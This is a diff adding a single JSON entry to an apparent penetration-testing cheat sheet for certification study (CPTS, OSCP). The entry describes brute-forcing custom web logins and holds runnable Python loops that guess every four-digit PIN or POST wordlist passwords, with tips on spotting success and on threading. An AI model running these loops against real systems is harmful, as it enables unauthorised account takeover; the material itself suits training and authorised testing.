@@ -1,0 +1,73 @@
+{
+  "id": "custom-brute-script",
+  "name": "Custom Python Brute-Force Script",
+  "type": "script",
+  "platform": "linux",
+  "command": "for pin in range(10000): requests.get(f'http://<ip>:<port>/pin?pin={pin:04d}')",
+  "description": "When hydra/medusa can't model a custom auth flow (odd tokens, JSON, multi-step, numeric PINs), a short Python requests loop brute-forces it. Detect success by status code, response length, or a keyword.",
+  "opsec": "loud",
+  "mitre": [
+    "T1110.001"
+  ],
+  "category": "Password Attacks",
+  "subcategory": "Brute Forcing",
+  "requires": [
+    "network-access"
+  ],
+  "tools": [
+    "python3",
+    "requests"
+  ],
+  "tags": [
+    "brute-force",
+    "python",
+    "custom",
+    "web"
+  ],
+  "variations": [
+    {
+      "label": "Numeric PIN brute (0000-9999)",
+      "command": "import requests\nfor pin in range(10000):\n    p=f'{pin:04d}'\n    r=requests.get(f'http://<ip>:<port>/pin?pin={p}')\n    if r.ok and 'flag' in r.text:\n        print('FOUND',p,r.text); break"
+    },
+    {
+      "label": "Dictionary attack (POST)",
+      "command": "import requests\nfor pw in open('<wordlist>').read().split():\n    r=requests.post(f'http://<ip>:<port>/login', data={'password':pw})\n    if 'Invalid' not in r.text:\n        print('FOUND',pw); break"
+    }
+  ],
+  "notes": "Success detection is the hard part - baseline a known-bad response first, then diff on status code, Content-Length, or a marker string ('Invalid'/'flag'). Add a session/CSRF-token fetch before each attempt if the app requires one. Thread with concurrent.futures for speed, but watch rate limits/lockout.",
+  "references": [
+    {
+      "title": "HTB Academy - Login Brute Forcing",
+      "url": "https://academy.hackthebox.com/module/details/57"
+    },
+    {
+      "title": "Python requests",
+      "url": "https://requests.readthedocs.io/"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "hydra-http-post-form",
+      "rel": "next",
+      "note": "Use hydra when the form is standard."
+    }
+  ],
+  "examples": [
+    {
+      "label": "4-digit PIN brute",
+      "command": "for pin in range(10000): requests.get(f'http://127.0.0.1:1234/pin?pin={pin:04d}')"
+    }
+  ],
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 16: Login Brute Forcing",
+  "exam": "exam-ok"
+}
